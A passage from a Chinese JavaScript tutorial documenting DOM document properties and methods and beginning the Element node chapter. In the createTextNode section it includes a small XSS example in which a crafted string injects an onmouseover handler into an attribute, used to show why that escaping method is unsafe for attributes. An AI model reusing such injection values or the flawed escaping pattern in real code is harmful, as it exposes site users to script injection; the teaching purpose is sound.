    ``document.referrer`` 的值，总是与 HTTP 头信息的 ``Referer`` 字段保持一致。但是， ``document.referrer`` 的拼写有两个 ``r`` ，而头信息的 ``Referer`` 字段只有一个 ``r`` 。

   **（8）document.dir**

    ``document.dir`` 返回一个字符串，表示文字方向。它只有两个可能的值： ``rtl`` 表示文字从右到左，阿拉伯文是这种方式； ``ltr`` 表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。

   **（9）document.compatMode**

    ``compatMode`` 属性返回浏览器处理文档的模式，可能的值为 ``BackCompat`` （向后兼容模式）和 ``CSS1Compat`` （严格模式）。

   一般来说，如果网页代码的第一行设置了明确的 ``DOCTYPE`` （比如 ``<!doctype html>`` ）， ``document.compatMode`` 的值都为 ``CSS1Compat`` 。

文档状态属性
~~~~~~~~~~

   **（1）document.hidden**

    ``document.hidden`` 属性返回一个布尔值，表示当前页面是否可见。如果窗口最小化、浏览器切换了 Tab，都会导致导致页面不可见，使得 ``document.hidden`` 返回 ``true`` 。

   这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。

   **（2）document.visibilityState**

    ``document.visibilityState`` 返回文档的可见状态。

   它的值有四种可能。

   > -  ``visible`` ：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。
   > -  ``hidden`` ：页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。
   > -  ``prerender`` ：页面处于正在渲染状态，对于用户来说，该页面不可见。
   > -  ``unloaded`` ：页面从内存里面卸载了。

   这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能。

   **（3）document.readyState**

    ``document.readyState`` 属性返回当前文档的状态，共有三种可能的值。

   -  ``loading`` ：加载 HTML 代码阶段（尚未完成解析）
   -  ``interactive`` ：加载外部资源阶段
   -  ``complete`` ：加载完成

   这个属性变化的过程如下。

   1. 浏览器开始解析 HTML 文档， ``document.readyState`` 属性等于 ``loading`` 。
   1. 浏览器遇到 HTML 文档中的 ``<script>`` 元素，并且没有 ``async`` 或 ``defer`` 属性，就暂停解析，开始执行脚本，这时 ``document.readyState`` 属性还是等于 ``loading`` 。
   1. HTML 文档解析完成， ``document.readyState`` 属性变成 ``interactive`` 。
   1. 浏览器等待图片、样式表、字体文件等外部资源加载完成，一旦全部加载完成， ``document.readyState`` 属性变成 ``complete`` 。

   下面的代码用来检查网页是否加载成功。

   .. code:: javascript

      // 基本检查
      if (document.readyState === 'complete') {
        // ...
      }
   
      // 轮询检查
      var interval = setInterval(function() {
        if (document.readyState === 'complete') {
          clearInterval(interval);
          // ...
        }
      }, 100);

   另外，每次状态变化都会触发一个 ``readystatechange`` 事件。

document.cookie
~~~~~~~~~~~~~~~~

    ``document.cookie`` 属性用来操作浏览器 Cookie，详见《浏览器模型》部分的《Cookie》章节。

document.designMode
~~~~~~~~~~~~~~~~~~~~

    ``document.designMode`` 属性控制当前文档是否可编辑。该属性只有两个值 ``on`` 和 ``off`` ，默认值为 ``off`` 。一旦设为 ``on`` ，用户就可以编辑整个文档的内容。

   下面代码打开 ``iframe`` 元素内部文档的 ``designMode`` 属性，就能将其变为一个所见即所得的编辑器。

   .. code:: javascript

      // HTML 代码如下
      // <iframe id="editor" src="about:blank"></iframe>
      var editor = document.getElementById('editor');
      editor.contentDocument.designMode = 'on';

document.currentScript
~~~~~~~~~~~~~~~~~~~~~~~

    ``document.currentScript`` 属性只用在 ``<script>`` 元素的内嵌脚本或加载的外部脚本之中，返回当前脚本所在的那个 DOM 节点，即 ``<script>`` 元素的 DOM 节点。

   .. code:: html

      <script id="foo">
        console.log(
          document.currentScript === document.getElementById('foo')
        ); // true
      </script>

   上面代码中， ``document.currentScript`` 就是 ``<script>`` 元素节点。

document.implementation
~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.implementation`` 属性返回一个 ``DOMImplementation`` 对象。该对象有三个方法，主要用于创建独立于当前文档的新的 Document 对象。

   -  ``DOMImplementation.createDocument()`` ：创建一个 XML 文档。
   -  ``DOMImplementation.createHTMLDocument()`` ：创建一个 HTML 文档。
   -  ``DOMImplementation.createDocumentType()`` ：创建一个 DocumentType 对象。

   下面是创建 HTML 文档的例子。

   .. code:: javascript

      var doc = document.implementation.createHTMLDocument('Title');
      var p = doc.createElement('p');
      p.innerHTML = 'hello world';
      doc.body.appendChild(p);
   
      document.replaceChild(
        doc.documentElement,
        document.documentElement
      );

   上面代码中，第一步生成一个新的 HTML 文档 ``doc`` ，然后用它的根元素 ``doc.documentElement`` 替换掉 ``document.documentElement`` 。这会使得当前文档的内容全部消失，变成 ``hello world`` 。

方法
---


document.open()，document.close()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.open`` 方法清除当前文档所有内容，使得文档处于可写状态，供 ``document.write`` 方法写入内容。

    ``document.close`` 方法用来关闭 ``document.open()`` 打开的文档。

   .. code:: javascript

      document.open();
      document.write('hello world');
      document.close();

document.write()，document.writeln()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.write`` 方法用于向当前文档写入内容。

   在网页的首次渲染阶段，只要页面没有关闭写入（即没有执行 ``document.close()`` ）， ``document.write`` 写入的内容就会追加在已有内容的后面。

   .. code:: javascript

      // 页面显示“helloworld”
      document.open();
      document.write('hello');
      document.write('world');
      document.close();

   注意， ``document.write`` 会当作 HTML 代码解析，不会转义。

   .. code:: javascript

      document.write('<p>hello world</p>');

   上面代码中， ``document.write`` 会将 ``<p>`` 当作 HTML 标签解释。

   如果页面已经解析完成（ ``DOMContentLoaded`` 事件发生之后），再调用 ``write`` 方法，它会先调用 ``open`` 方法，擦除当前文档所有内容，然后再写入。

   .. code:: javascript

      document.addEventListener('DOMContentLoaded', function (event) {
        document.write('<p>Hello World!</p>');
      });
   
      // 等同于
      document.addEventListener('DOMContentLoaded', function (event) {
        document.open();
        document.write('<p>Hello World!</p>');
        document.close();
      });

   如果在页面渲染过程中调用 ``write`` 方法，并不会自动调用 ``open`` 方法。（可以理解成， ``open`` 方法已调用，但 ``close`` 方法还未调用。）

   .. code:: html

      <html>
      <body>
      hello
      <script type="text/javascript">
        document.write("world")
      </script>
      </body>
      </html>

   在浏览器打开上面网页，将会显示 ``hello world`` 。

    ``document.write`` 是 JavaScript 语言标准化之前就存在的方法，现在完全有更符合标准的方法向文档写入内容（比如对 ``innerHTML`` 属性赋值）。所以，除了某些特殊情况，应该尽量避免使用 ``document.write`` 这个方法。

    ``document.writeln`` 方法与 ``write`` 方法完全一致，除了会在输出内容的尾部添加换行符。

   .. code:: javascript

      document.write(1);
      document.write(2);
      // 12
   
      document.writeln(1);
      document.writeln(2);
      // 1
      // 2
      //

   注意， ``writeln`` 方法添加的是 ASCII 码的换行符，渲染成 HTML 网页时不起作用，即在网页上显示不出换行。网页上的换行，必须显式写入 ``<br>`` 。

document.querySelector()，document.querySelectorAll()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.querySelector`` 方法接受一个 CSS 选择器作为参数，返回匹配该选择器的元素节点。如果有多个节点满足匹配条件，则返回第一个匹配的节点。如果没有发现匹配的节点，则返回 ``null`` 。

   .. code:: javascript

      var el1 = document.querySelector('.myclass');
      var el2 = document.querySelector('#myParent > [ng-click]');

    ``document.querySelectorAll`` 方法与 ``querySelector`` 用法类似，区别是返回一个 ``NodeList`` 对象，包含所有匹配给定选择器的节点。

   .. code:: javascript

      elementList = document.querySelectorAll('.myclass');

   这两个方法的参数，可以是逗号分隔的多个 CSS 选择器，返回匹配其中一个选择器的元素节点，这与 CSS 选择器的规则是一致的。

   .. code:: javascript

      var matches = document.querySelectorAll('div.note, div.alert');

   上面代码返回 ``class`` 属性是 ``note`` 或 ``alert`` 的 ``div`` 元素。

   这两个方法都支持复杂的 CSS 选择器。

   .. code:: javascript

      // 选中 data-foo-bar 属性等于 someval 的元素
      document.querySelectorAll('[data-foo-bar="someval"]');
   
      // 选中 myForm 表单中所有不通过验证的元素
      document.querySelectorAll('#myForm :invalid');
   
      // 选中div元素，那些 class 含 ignore 的除外
      document.querySelectorAll('DIV:not(.ignore)');
   
      // 同时选中 div，a，script 三类元素
      document.querySelectorAll('DIV, A, SCRIPT');

   但是，它们不支持 CSS 伪元素的选择器（比如 ``:first-line`` 和 ``:first-letter`` ）和伪类的选择器（比如 ``:link`` 和 ``:visited`` ），即无法选中伪元素和伪类。

   如果 ``querySelectorAll`` 方法的参数是字符串 ``*`` ，则会返回文档中的所有元素节点。另外， ``querySelectorAll`` 的返回结果不是动态集合，不会实时反映元素节点的变化。

   最后，这两个方法除了定义在 ``document`` 对象上，还定义在元素节点上，即在元素节点上也可以调用。

document.getElementsByTagName()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.getElementsByTagName()`` 方法搜索 HTML 标签名，返回符合条件的元素。它的返回值是一个类似数组对象（ ``HTMLCollection`` 实例），可以实时反映 HTML 文档的变化。如果没有任何匹配的元素，就返回一个空集。

   .. code:: javascript

      var paras = document.getElementsByTagName('p');
      paras instanceof HTMLCollection // true

   上面代码返回当前文档的所有 ``p`` 元素节点。

   HTML 标签名是大小写不敏感的，因此 ``getElementsByTagName()`` 方法的参数也是大小写不敏感的。另外，返回结果中，各个成员的顺序就是它们在文档中出现的顺序。

   如果传入 ``*`` ，就可以返回文档中所有 HTML 元素。

   .. code:: javascript

      var allElements = document.getElementsByTagName('*');

   注意，元素节点本身也定义了 ``getElementsByTagName`` 方法，返回该元素的后代元素中符合条件的元素。也就是说，这个方法不仅可以在 ``document`` 对象上调用，也可以在任何元素节点上调用。

   .. code:: javascript

      var firstPara = document.getElementsByTagName('p')[0];
      var spans = firstPara.getElementsByTagName('span');

   上面代码选中第一个 ``p`` 元素内部的所有 ``span`` 元素。

document.getElementsByClassName()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.getElementsByClassName()`` 方法返回一个类似数组的对象（ ``HTMLCollection`` 实例），包括了所有 ``class`` 名字符合指定条件的元素，元素的变化实时反映在返回结果中。

   .. code:: javascript

      var elements = document.getElementsByClassName(names);

   由于 ``class`` 是保留字，所以 JavaScript 一律使用 ``className`` 表示 CSS 的 ``class`` 。

   参数可以是多个 ``class`` ，它们之间使用空格分隔。

   .. code:: javascript

      var elements = document.getElementsByClassName('foo bar');

   上面代码返回同时具有 ``foo`` 和 ``bar`` 两个 ``class`` 的元素， ``foo`` 和 ``bar`` 的顺序不重要。

   注意，正常模式下，CSS 的 ``class`` 是大小写敏感的。（ ``quirks mode`` 下，大小写不敏感。）

   与 ``getElementsByTagName()`` 方法一样， ``getElementsByClassName()`` 方法不仅可以在 ``document`` 对象上调用，也可以在任何元素节点上调用。

   .. code:: javascript

      // 非document对象上调用
      var elements = rootElement.getElementsByClassName(names);

document.getElementsByName()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.getElementsByName()`` 方法用于选择拥有 ``name`` 属性的 HTML 元素（比如 ``<form>`` 、 ``<radio>`` 、 ``<img>`` 、 ``<frame>`` 、 ``<embed>`` 和 ``<object>`` 等），返回一个类似数组的的对象（ ``NodeList`` 实例），因为 ``name`` 属性相同的元素可能不止一个。

   .. code:: javascript

      // 表单为 <form name="x"></form>
      var forms = document.getElementsByName('x');
      forms[0].tagName // "FORM"

document.getElementById()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.getElementById()`` 方法返回匹配指定 ``id`` 属性的元素节点。如果没有发现匹配的节点，则返回 ``null`` 。

   .. code:: javascript

      var elem = document.getElementById('para1');

   注意，该方法的参数是大小写敏感的。比如，如果某个节点的 ``id`` 属性是 ``main`` ，那么 ``document.getElementById('Main')`` 将返回 ``null`` 。

    ``document.getElementById()`` 方法与 ``document.querySelector()`` 方法都能获取元素节点，不同之处是 ``document.querySelector()`` 方法的参数使用 CSS 选择器语法， ``document.getElementById()`` 方法的参数是元素的 ``id`` 属性。

   .. code:: javascript

      document.getElementById('myElement')
      document.querySelector('#myElement')

   上面代码中，两个方法都能选中 ``id`` 为 ``myElement`` 的元素，但是 ``document.getElementById()`` 比 ``document.querySelector()`` 效率高得多。

   另外，这个方法只能在 ``document`` 对象上使用，不能在其他元素节点上使用。

document.elementFromPoint()，document.elementsFromPoint()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.elementFromPoint()`` 方法返回位于页面指定位置最上层的元素节点。

   .. code:: javascript

      var element = document.elementFromPoint(50, 50);

   上面代码选中在 ``(50, 50)`` 这个坐标位置的最上层的那个 HTML 元素。

    ``elementFromPoint`` 方法的两个参数，依次是相对于当前视口左上角的横坐标和纵坐标，单位是像素。如果位于该位置的 HTML 元素不可返回（比如文本框的滚动条），则返回它的父元素（比如文本框）。如果坐标值无意义（比如负值或超过视口大小），则返回 ``null`` 。

    ``document.elementsFromPoint()`` 返回一个数组，成员是位于指定坐标（相对于视口）的所有元素。

   .. code:: javascript

      var elements = document.elementsFromPoint(x, y);

document.createElement()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createElement`` 方法用来生成元素节点，并返回该节点。

   .. code:: javascript

      var newDiv = document.createElement('div');

    ``createElement`` 方法的参数为元素的标签名，即元素节点的 ``tagName`` 属性，对于 HTML 网页大小写不敏感，即参数为 ``div`` 或 ``DIV`` 返回的是同一种节点。如果参数里面包含尖括号（即 ``<`` 和 ``>`` ）会报错。

   .. code:: javascript

      document.createElement('<div>');
      // DOMException: The tag name provided ('<div>') is not a valid name

   注意， ``document.createElement`` 的参数可以是自定义的标签名。

   .. code:: javascript

      document.createElement('foo');

document.createTextNode()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createTextNode`` 方法用来生成文本节点（ ``Text`` 实例），并返回该节点。它的参数是文本节点的内容。

   .. code:: javascript

      var newDiv = document.createElement('div');
      var newContent = document.createTextNode('Hello');
      newDiv.appendChild(newContent);

   上面代码新建一个 ``div`` 节点和一个文本节点，然后将文本节点插入 ``div`` 节点。

   这个方法可以确保返回的节点，被浏览器当作文本渲染，而不是当作 HTML 代码渲染。因此，可以用来展示用户的输入，避免 XSS 攻击。

   .. code:: javascript

      var div = document.createElement('div');
      div.appendChild(document.createTextNode('<span>Foo & bar</span>'));
      console.log(div.innerHTML)
      // &lt;span&gt;Foo &amp; bar&lt;/span&gt;

   上面代码中， ``createTextNode`` 方法对大于号和小于号进行转义，从而保证即使用户输入的内容包含恶意代码，也能正确显示。

   需要注意的是，该方法不对单引号和双引号转义，所以不能用来对 HTML 属性赋值。

   .. code:: html

      function escapeHtml(str) {
        var div = document.createElement('div');
        div.appendChild(document.createTextNode(str));
        return div.innerHTML;
      };
   
      var userWebsite = '" onmouseover="alert(\'derp\')" "';
      var profileLink = '<a href="' + escapeHtml(userWebsite) + '">Bob</a>';
      var div = document.getElementById('target');
      div.innerHTML = profileLink;
      // <a href="" onmouseover="alert('derp')" "">Bob</a>

   上面代码中，由于 ``createTextNode`` 方法不转义双引号，导致 ``onmouseover`` 方法被注入了代码。

document.createAttribute()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createAttribute`` 方法生成一个新的属性节点（ ``Attr`` 实例），并返回它。

   .. code:: javascript

      var attribute = document.createAttribute(name);

    ``document.createAttribute`` 方法的参数 ``name`` ，是属性的名称。

   .. code:: javascript

      var node = document.getElementById('div1');
   
      var a = document.createAttribute('my_attrib');
      a.value = 'newVal';
   
      node.setAttributeNode(a);
      // 或者
      node.setAttribute('my_attrib', 'newVal');

   上面代码为 ``div1`` 节点，插入一个值为 ``newVal`` 的 ``my_attrib`` 属性。

document.createComment()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createComment`` 方法生成一个新的注释节点，并返回该节点。

   .. code:: javascript

      var CommentNode = document.createComment(data);

    ``document.createComment`` 方法的参数是一个字符串，会成为注释节点的内容。

document.createDocumentFragment()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createDocumentFragment`` 方法生成一个空的文档片段对象（ ``DocumentFragment`` 实例）。

   .. code:: javascript

      var docFragment = document.createDocumentFragment();

    ``DocumentFragment`` 是一个存在于内存的 DOM 片段，不属于当前文档，常常用来生成一段较复杂的 DOM 结构，然后再插入当前文档。这样做的好处在于，因为 ``DocumentFragment`` 不属于当前文档，对它的任何改动，都不会引发网页的重新渲染，比直接修改当前文档的 DOM 有更好的性能表现。

   .. code:: javascript

      var docfrag = document.createDocumentFragment();
   
      [1, 2, 3, 4].forEach(function (e) {
        var li = document.createElement('li');
        li.textContent = e;
        docfrag.appendChild(li);
      });
   
      var element  = document.getElementById('ul');
      element.appendChild(docfrag);

   上面代码中，文档片段 ``docfrag`` 包含四个 ``<li>`` 节点，这些子节点被一次性插入了当前文档。

document.createEvent()
~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createEvent`` 方法生成一个事件对象（ ``Event`` 实例），该对象可以被 ``element.dispatchEvent`` 方法使用，触发指定事件。

   .. code:: javascript

      var event = document.createEvent(type);

    ``document.createEvent`` 方法的参数是事件类型，比如 ``UIEvents`` 、 ``MouseEvents`` 、 ``MutationEvents`` 、 ``HTMLEvents`` 。

   .. code:: javascript

      var event = document.createEvent('Event');
      event.initEvent('build', true, true);
      document.addEventListener('build', function (e) {
        console.log(e.type); // "build"
      }, false);
      document.dispatchEvent(event);

   上面代码新建了一个名为 ``build`` 的事件实例，然后触发该事件。

document.addEventListener()，document.removeEventListener()，document.dispatchEvent()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



   .. code:: javascript

      // 添加事件监听函数
      document.addEventListener('click', listener, false);
   
      // 移除事件监听函数
      document.removeEventListener('click', listener, false);
   
      // 触发事件
      var event = new Event('click');
      document.dispatchEvent(event);

document.hasFocus()
~~~~~~~~~~~~~~~~~~~~

    ``document.hasFocus`` 方法返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。

   .. code:: javascript

      var focused = document.hasFocus();

   注意，有焦点的文档必定被激活（active），反之不成立，激活的文档未必有焦点。比如，用户点击按钮，从当前窗口跳出一个新窗口，该新窗口就是激活的，但是不拥有焦点。

document.adoptNode()，document.importNode()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.adoptNode`` 方法将某个节点及其子节点，从原来所在的文档或 ``DocumentFragment`` 里面移除，归属当前 ``document`` 对象，返回插入后的新节点。插入的节点对象的 ``ownerDocument`` 属性，会变成当前的 ``document`` 对象，而 ``parentNode`` 属性是 ``null`` 。

   .. code:: javascript

      var node = document.adoptNode(externalNode);
      document.appendChild(node);

   注意， ``document.adoptNode`` 方法只是改变了节点的归属，并没有将这个节点插入新的文档树。所以，还要再用 ``appendChild`` 方法或 ``insertBefore`` 方法，将新节点插入当前文档树。

    ``document.importNode`` 方法则是从原来所在的文档或 ``DocumentFragment`` 里面，拷贝某个节点及其子节点，让它们归属当前 ``document`` 对象。拷贝的节点对象的 ``ownerDocument`` 属性，会变成当前的 ``document`` 对象，而 ``parentNode`` 属性是 ``null`` 。

   .. code:: javascript

      var node = document.importNode(externalNode, deep);

    ``document.importNode`` 方法的第一个参数是外部节点，第二个参数是一个布尔值，表示对外部节点是深拷贝还是浅拷贝，默认是浅拷贝（false）。虽然第二个参数是可选的，但是建议总是保留这个参数，并设为 ``true`` 。

   注意， ``document.importNode`` 方法只是拷贝外部节点，这时该节点的父节点是 ``null`` 。下一步还必须将这个节点插入当前文档树。

   .. code:: javascript

      var iframe = document.getElementsByTagName('iframe')[0];
      var oldNode = iframe.contentWindow.document.getElementById('myNode');
      var newNode = document.importNode(oldNode, true);
      document.getElementById("container").appendChild(newNode);

   上面代码从 ``iframe`` 窗口，拷贝一个指定节点 ``myNode`` ，插入当前文档。

document.createNodeIterator()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createNodeIterator`` 方法返回一个子节点遍历器。

   .. code:: javascript

      var nodeIterator = document.createNodeIterator(
        document.body,
        NodeFilter.SHOW_ELEMENT
      );

   上面代码返回 ``<body>`` 元素子节点的遍历器。

    ``document.createNodeIterator`` 方法第一个参数为所要遍历的根节点，第二个参数为所要遍历的节点类型，这里指定为元素节点（ ``NodeFilter.SHOW_ELEMENT`` ）。几种主要的节点类型写法如下。

   - 所有节点：NodeFilter.SHOW_ALL
   - 元素节点：NodeFilter.SHOW_ELEMENT
   - 文本节点：NodeFilter.SHOW_TEXT
   - 评论节点：NodeFilter.SHOW_COMMENT

    ``document.createNodeIterator`` 方法返回一个“遍历器”对象（ ``NodeFilter`` 实例）。该实例的 ``nextNode()`` 方法和 ``previousNode()`` 方法，可以用来遍历所有子节点。

   .. code:: javascript

      var nodeIterator = document.createNodeIterator(document.body);
      var pars = [];
      var currentNode;
   
      while (currentNode = nodeIterator.nextNode()) {
        pars.push(currentNode);
      }

   上面代码中，使用遍历器的 ``nextNode`` 方法，将根节点的所有子节点，依次读入一个数组。 ``nextNode`` 方法先返回遍历器的内部指针所在的节点，然后会将指针移向下一个节点。所有成员遍历完成后，返回 ``null`` 。 ``previousNode`` 方法则是先将指针移向上一个节点，然后返回该节点。

   .. code:: javascript

      var nodeIterator = document.createNodeIterator(
        document.body,
        NodeFilter.SHOW_ELEMENT
      );
   
      var currentNode = nodeIterator.nextNode();
      var previousNode = nodeIterator.previousNode();
   
      currentNode === previousNode // true

   上面代码中， ``currentNode`` 和 ``previousNode`` 都指向同一个的节点。

   注意，遍历器返回的第一个节点，总是根节点。

   .. code:: javascript

      pars[0] === document.body // true

document.createTreeWalker()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``document.createTreeWalker`` 方法返回一个 DOM 的子树遍历器。它与 ``document.createNodeIterator`` 方法基本是类似的，区别在于它返回的是 ``TreeWalker`` 实例，后者返回的是 ``NodeIterator`` 实例。另外，它的第一个节点不是根节点。

    ``document.createTreeWalker`` 方法的第一个参数是所要遍历的根节点，第二个参数指定所要遍历的节点类型（与 ``document.createNodeIterator`` 方法的第二个参数相同）。

   .. code:: javascript

      var treeWalker = document.createTreeWalker(
        document.body,
        NodeFilter.SHOW_ELEMENT
      );
   
      var nodeList = [];
   
      while(treeWalker.nextNode()) {
        nodeList.push(treeWalker.currentNode);
      }

   上面代码遍历 ``<body>`` 节点下属的所有元素节点，将它们插入 ``nodeList`` 数组。

document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



   如果 ``document.designMode`` 属性设为 ``on`` ，那么整个文档用户可编辑；如果元素的 ``contenteditable`` 属性设为 ``true`` ，那么该元素可编辑。这两种情况下，可以使用 ``document.execCommand()`` 方法，改变内容的样式，比如 ``document.execCommand('bold')`` 会使得字体加粗。

   .. code:: javascript

      document.execCommand(command, showDefaultUI, input)

   该方法接受三个参数。

   -  ``command`` ：字符串，表示所要实施的样式。
   -  ``showDefaultUI`` ：布尔值，表示是否要使用默认的用户界面，建议总是设为 ``false`` 。
   -  ``input`` ：字符串，表示该样式的辅助内容，比如生成超级链接时，这个参数就是所要链接的网址。如果第二个参数设为 ``true`` ，那么浏览器会弹出提示框，要求用户在提示框输入该参数。但是，不是所有浏览器都支持这样做，为了兼容性，还是需要自己部署获取这个参数的方式。

   .. code:: javascript

      var url = window.prompt('请输入网址');
   
      if (url) {
        document.execCommand('createlink', false, url);
      }

   上面代码中，先提示用户输入所要链接的网址，然后手动生成超级链接。注意，第二个参数是 ``false`` ，表示此时不需要自动弹出提示框。

    ``document.execCommand()`` 的返回值是一个布尔值。如果为 ``false`` ，表示这个方法无法生效。

   这个方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，那么只对当前焦点所在的元素生效。

    ``document.execCommand()`` 方法可以执行的样式改变有很多种，下面是其中的一些：bold、insertLineBreak、selectAll、createLink、insertOrderedList、subscript、delete、insertUnorderedList、superscript、formatBlock、insertParagraph、undo、forwardDelete、insertText、unlink、insertImage、italic、unselect、insertHTML、redo。这些值都可以用作第一个参数，它们的含义不难从字面上看出来。

   **（2）document.queryCommandSupported()**

    ``document.queryCommandSupported()`` 方法返回一个布尔值，表示浏览器是否支持 ``document.execCommand()`` 的某个命令。

   .. code:: javascript

      if (document.queryCommandSupported('SelectAll')) {
        console.log('浏览器支持选中可编辑区域的所有内容');
      }

   **（3）document.queryCommandEnabled()**

    ``document.queryCommandEnabled()`` 方法返回一个布尔值，表示当前是否可用 ``document.execCommand()`` 的某个命令。比如， ``bold`` （加粗）命令只有存在文本选中时才可用，如果没有选中文本，就不可用。

   .. code:: javascript

      // HTML 代码为
      // <input type="button" value="Copy" onclick="doCopy()">
   
      function doCopy(){
        // 浏览器是否支持 copy 命令（选中内容复制到剪贴板）
        if (document.queryCommandSupported('copy')) {
          copyText('你好');
        }else{
          console.log('浏览器不支持');
        }
      }
   
      function copyText(text) {
        var input = document.createElement('textarea');
        document.body.appendChild(input);
        input.value = text;
        input.focus();
        input.select();
   
        // 当前是否有选中文字
        if (document.queryCommandEnabled('copy')) {
          var success = document.execCommand('copy');
          input.remove();
          console.log('Copy Ok');
        } else {
          console.log('queryCommandEnabled is false');
        }
      }

   上面代码中，先判断浏览器是否支持 ``copy`` 命令（允许可编辑区域的选中内容，复制到剪贴板），如果支持，就新建一个临时文本框，里面写入内容“你好”，并将其选中。然后，判断是否选中成功，如果成功，就将“你好”复制到剪贴板，再删除那个临时文本框。

document.getSelection()
~~~~~~~~~~~~~~~~~~~~~~~~

   这个方法指向 ``window.getSelection()`` ，参见 ``window`` 对象一节的介绍。

/🟠 Element 节点
================


简介
---

    ``Element`` 节点对象对应网页的 HTML 元素。每一个 HTML 元素，在 DOM 树上都会转化成一个 ``Element`` 节点对象（以下简称元素节点）。

   元素节点的 ``nodeType`` 属性都是 ``1`` 。

   .. code:: javascript

      var p = document.querySelector('p');
      p.nodeName // "P"
      p.nodeType // 1

    ``Element`` 对象继承了 ``Node`` 接口，因此 ``Node`` 的属性和方法在 ``Element`` 对象都存在。

   此外，不同的 HTML 元素对应的元素节点是不一样的，浏览器使用不同的构造函数，生成不同的元素节点，比如 ``<a>`` 元素的构造函数是 ``HTMLAnchorElement()`` ， ``<button>`` 是 ``HTMLButtonElement()`` 。因此，元素节点不是一种对象，而是许多种对象，这些对象除了继承 ``Element`` 对象的属性和方法，还有各自独有的属性和方法。

实例属性
-------


元素特性的相关属性
~~~~~~~~~~~~~~~

   **（1）Element.id**

    ``Element.id`` 属性返回指定元素的 ``id`` 属性，该属性可读写。

   .. code:: javascript

      // HTML 代码为 <p id="foo">
      var p = document.querySelector('p');
      p.id // "foo"

   注意， ``id`` 属性的值是大小写敏感，即浏览器能正确识别 ``<p id="foo">`` 和 ``<p id="FOO">`` 这两个元素的 ``id`` 属性，但是最好不要这样命名。

   **（2）Element.tagName**

    ``Element.tagName`` 属性返回指定元素的大写标签名，与 ``nodeName`` 属性的值相等。

   .. code:: javascript

      // HTML代码为
      // <span id="myspan">Hello</span>
      var span = document.getElementById('myspan');
      span.id // "myspan"
      span.tagName // "SPAN"

   **（3）Element.dir**

    ``Element.dir`` 属性用于读写当前元素的文字方向，可能是从左到右（ ``"ltr"`` ），也可能是从右到左（ ``"rtl"`` ）。

   **（4）Element.accessKey**

    ``Element.accessKey`` 属性用于读写分配给当前元素的快捷键。

   .. code:: javascript

      // HTML 代码如下
      // <button accesskey="h" id="btn">点击</button>
      var btn = document.getElementById('btn');
      btn.accessKey // "h"

   上面代码中， ``btn`` 元素的快捷键是 ``h`` ，按下 ``Alt + h`` 就能将焦点转移到它上面。

   **（5）Element.draggable**

    ``Element.draggable`` 属性返回一个布尔值，表示当前元素是否可拖动。该属性可读写。

   **（6）Element.lang**

    ``Element.lang`` 属性返回当前元素的语言设置。该属性可读写。

   .. code:: javascript

      // HTML 代码如下
      // <html lang="en">
      document.documentElement.lang // "en"

   **（7）Element.tabIndex**

    ``Element.tabIndex`` 属性返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。

    ``tabIndex`` 属性值如果是负值（通常是 ``-1`` ），则 Tab 键不会遍历到该元素。如果是正整数，则按照顺序，从小到大遍历。如果两个元素的 ``tabIndex`` 属性的正整数值相同，则按照出现的顺序遍历。遍历完所有 ``tabIndex`` 为正整数的元素以后，再遍历所有 ``tabIndex`` 等于 ``0`` 、或者属性值是非法值、或者没有 ``tabIndex`` 属性的元素，顺序为它们在网页中出现的顺序。

   **（8）Element.title**

    ``Element.title`` 属性用来读写当前元素的 HTML 属性 ``title`` 。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。

元素状态的相关属性
~~~~~~~~~~~~~~~

   **（1）Element.hidden**

    ``Element.hidden`` 属性返回一个布尔值，表示当前 HTML 元素的 ``hidden`` 属性的值。该属性可读写，用来控制当前元素是否可见。

   .. code:: javascript

      var btn = document.getElementById('btn');
      var mydiv = document.getElementById('mydiv');
   
      btn.addEventListener('click', function () {
        mydiv.hidden = !mydiv.hidden;
      }, false);

   注意，该属性与 CSS 设置是互相独立的。CSS 对当前元素可见性的设置， ``Element.hidden`` 并不能反映出来。也就是说，这个属性并不能用来判断当前元素的实际可见性。

   CSS 设置的优先级高于 ``Element.hidden`` 。如果 CSS 指定了该元素不可见（ ``display: none`` ）或可见（ ``visibility: visible`` ），那么 ``Element.hidden`` 并不能改变该元素实际的可见性。换言之，这个属性只在 CSS 没有明确设定当前元素的可见性时才有效。

   **（2）Element.contentEditable，Element.isContentEditable**

   HTML 元素可以设置 ``contentEditable`` 属性，使得元素的内容可以编辑。

   .. code:: html

      <div contenteditable>123</div>

